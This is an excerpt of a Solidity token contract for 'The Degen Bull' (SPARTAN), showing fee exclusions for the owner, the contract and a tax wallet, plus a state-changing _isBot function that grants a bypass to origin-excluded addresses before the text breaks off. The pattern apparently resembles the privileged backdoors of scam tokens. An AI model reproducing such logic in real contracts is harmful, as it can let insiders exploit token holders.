...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isSPARTANExcludedFromFees;
    ...
    string private _name = unicode"The Degen Bull";
    string private _symbol = unicode"SPARTAN";
    ...
    constructor() payable {
        ...
        _isSPARTANExcludedFromFees[owner()] = true;
        _isSPARTANExcludedFromFees[address(this)] = true;
        _isSPARTANExcludedFromFees[_taxWallet] = true;
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isSPARTANExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
